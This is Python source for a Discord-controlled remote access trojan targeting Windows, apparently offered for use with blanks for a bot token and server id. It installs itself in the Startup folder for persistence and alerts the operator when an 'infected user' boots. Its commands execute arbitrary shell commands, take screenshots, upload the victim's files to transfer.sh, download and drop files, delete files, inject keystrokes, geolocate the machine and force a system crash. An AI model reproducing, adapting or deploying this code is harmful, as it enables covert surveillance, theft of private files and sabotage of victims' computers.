import ctypes
import ctypes.wintypes
import json
import os
import os.path
import time
import urllib.request
from os import getenv, startfile
from os.path import join, exists
from shutil import copy

import discord
import pyautogui
import requests
from discord import *
from discord.utils import get

global ping_on_startup
global token
global guild_iD
guild_iD = ""
# guild id here
token = ""
# Bot Token Here Obviously
# Bot needs all intents
ping_on_startup = True
# if the bot should ping you when an infected user starts his Computer


path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/control.pyw" % getenv("userprofile")
if not exists(path):
	copy(__file__, path)
	startfile(path)


class Control(discord.Client):
	def __init__(self):
		super().__init__(intents=discord.Intents.all())
		self.tree = app_commands.CommandTree(self)

	async def setup_hook(self):
		self.tree.copy_global_to(guild=discord.Object(id=int(guild_iD)))
		await self.tree.sync(guild=discord.Object(id=int(guild_iD)))


bot = Control()


@bot.event
async def on_ready():
	# print(f"logged in as [{bot.user}]")
	username = os.getenv("username")
	for guild in bot.guilds:
		channel = get(guild.text_channels, name="d")
		if ping_on_startup:
			try:
				await channel.send(f"@everyone `{username}` started `{__file__}`")
			except:
				pass


def filedownload(url: str, directory: str, filename: str):
	loc = directory + "\\" + filename
	try:
		output = urllib.request.urlretrieve(url, loc)
	except Exception as err:
		output = f"Error: {err}"
	return output


def delete(filelocation: str):
	filelocation = filelocation.casefold().replace("%user%", os.getenv("username"))
	filelocation = filelocation.casefold().replace("%username%", os.getenv("username"))
	if exists(filelocation):
		os.remove(filelocation)
		output = f"File `{filelocation}` deleted"
	else:
		output = f"File `{filelocation}` not found"
	return output


def transfer(filelocation: str):
	filelocation = filelocation.casefold().replace("%user%", os.getenv("username"))
	filelocation = filelocation.casefold().replace("%username%", os.getenv("username"))

	if exists(filelocation):
		fileToUpload = {"file": (filelocation, open(filelocation, mode='rb'))}
		r = requests.post("https://transfer.sh/", files=fileToUpload)
		output = r.text
	else:
		output = f"File {filelocation} not found"
	return output


def doScreenshot():
	name = time.strftime("%Y%m%d-%H%M%S.jpg")
	path = join(os.getenv("TEMP"), name)
	pyautogui.screenshot(path)
	return name, path


def ListDir(directory):
	s = ""
	dirToList = directory
	if exists(dirToList):
		ListedDir = os.listdir(dirToList)
		for i in ListedDir:
			s += f" -> `{i}`\n"
	else:
		s = f"Directory `{dirToList}` not found"
	return s


def victimtype(toPress: str):
	wrote = []
	args = toPress.casefold().split("enter")
	for i in args:
		pyautogui.typewrite(i)
		wrote.append(i)
		time.sleep(0.2)
		pyautogui.press('enter')
		time.sleep(0.2)
	return f"Wrote `{wrote}`"


def getTasklist():
	t = os.popen("tasklist").read()
	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt", "w") as f:
		f.write(t)
	f.close()
	return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt"


def systemInfo():
	output = ""
	ip = get('https://api.ipify.org')
	envsToGet = ["LANG", "COMPUTERNAME", "COMMONPROGRAMFILES", "LOCALAPPDATA", "OS", "PROCESSOR_ARCHITECTURE",
	             "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
	for i in envsToGet:
		output += f"{i} = {os.getenv(i)}\n"
	import platform
	info = platform.uname()
	info_total = f"""
        System: {info.system}
	Release: {info.release}
	Machine: {info.machine}
	Processor: {info.processor}
	Ip: {ip}
	"""
	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", "w") as f:
		f.write(info_total)
	f.close()
	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\environmentalVariables.txt", "w") as f:
		f.write(output)
	f.close()

	return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\environmentalVariables.txt"


def searchFile(directory: str, keyword: str):
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%username%", os.getenv("USERNAME"))
	if exists(directory):
		Files = os.listdir(directory)
		found_files = []
		for file in Files:
			if keyword.lower() in file.lower():
				found_files.append(file)
		if found_files:
			output = f"Found Files in `{directory}`:\n"
			for file in found_files:
				output += f" -> `{file}`\n"
		else:
			output = f"No File mayching Keyword `{keyword} in {directory} found"
		return output
	else:
		output = f"Directory `{directory}` not found"
	return output.format()


def geolocate():
	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
		data = json.loads(url.read().decode())
		link = f"https://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
		link = f" successfully got Google Maps Coordinates: {link}"
		return link


def crash():
	ntdll = ctypes.windll.ntdll
	prev_value = ctypes.c_bool()
	res = ctypes.c_ulong()
	ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))

	if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
		output = "Successfully crashed machine"
	else:
		output = "Failed to crash machine"
	return output

@bot.tree.command(name="crash",
                  description="crash your victim's computer")
async def geo(interaction: discord.Interaction):
	await interaction.response.send_message(f"crashing machine...")
	await interaction.channel.send(crash())


@bot.tree.command(name="cmd", description="execute command in cmd")
async def cmd(interaction: discord.Interaction, command: str):
	await interaction.response.send_message(f"executing command `{command}`...")
	x = ""
	try:
		x = os.popen(command).read()
	except Exception as err:
		await interaction.channel.send(f"Error: {err}")
	if x == "":
		await interaction.channel.send(f"Command `{command}` doesn't return anything/isn't valid")
	else:
		await interaction.channel.send(f"command `{command}` returned:\n ```{x}```")


@bot.tree.command(name="listdir", description="list all files in a specific directory (use %user% instead of username)")
async def listdir(interaction: discord.Interaction, directory: str):
	directory = directory.casefold().replace("%user%", os.getenv("USERNAME"))
	directory = directory.casefold().replace("%USERNAME%", os.getenv("USERNAME"))
	await interaction.response.send_message(f"displaying `{directory}`...")
	await interaction.channel.send(f"{ListDir(directory)}")


@bot.tree.command(name="write", description="make your victim write something")
async def typing(interaction: discord.Interaction, message: str):
	await interaction.response.send_message(f"typing `{message}`...")
	await interaction.channel.send(victimtype(message))


@bot.tree.command(name="tasklist",
                  description="list all running processes")
async def tasklist(interaction: discord.Interaction):
	await interaction.response.send_message(f"listing all tasks...")
	await interaction.channel.send(file=discord.File(getTasklist()))
	os.remove(getTasklist())


@bot.tree.command(name="geolocate",
                  description="get the geolocation of the of the machine with google maps (not very precise)")
async def geo(interaction: discord.Interaction):
	await interaction.response.send_message(f"getting geolocation by ip...")
	await interaction.channel.send(geolocate())


@bot.tree.command(name="systeminfo",
                  description="attempt to get system info")
async def sysinfo(interaction: discord.Interaction):
	await interaction.response.send_message(f"getting system info...")
	systempath, envpath = systemInfo()
	await interaction.channel.send(file=discord.File(systempath))
	await interaction.channel.send(file=discord.File(envpath))
	os.remove(systempath)
	os.remove(envpath)


@bot.tree.command(name="screenshot", description="get a screenshot of the victim")
async def scr(interaction: discord.Interaction):
	name, path = doScreenshot()
	await interaction.response.send_message(f"Screenshot taken, sending...")
	await interaction.channel.send(file=discord.File(path))
	os.remove(path)


@bot.tree.command(name="upload",
                  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
async def upload(interaction: discord.Interaction, location: str):
	await interaction.response.send_message(f"searching for `{location}`...")
	await interaction.channel.send(transfer(location))


@bot.tree.command(name="search",
                  description="search for a file on the victim's pc pc (use %user% instead of username)")
async def search(interaction: discord.Interaction, location: str, keyword: str):
	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
	await interaction.channel.send(searchFile(location, keyword))


@bot.tree.command(name="delete_file", description="delete a file of the victim (use %user% instead of username)")
async def deleteFile(interaction: discord.Interaction, locinput: str):
	await interaction.response.send_message(f"searching for `{locinput}`...")
	await interaction.channel.send(delete(locinput))


@bot.tree.command(name="download",
                  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
async def downloadFile(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
	await interaction.response.send_message(f"searching for `{targeturl}`...")
	await interaction.channel.send(filedownload(targeturl, directory, filename))


@bot.tree.command(name="log_out", description="log the victim out of their User account")
async def scr(interaction: discord.Interaction):
	os.system("shutdown /l /f")
	await interaction.response.send_message(f"Successfully logged out")


bot.run(token=token)
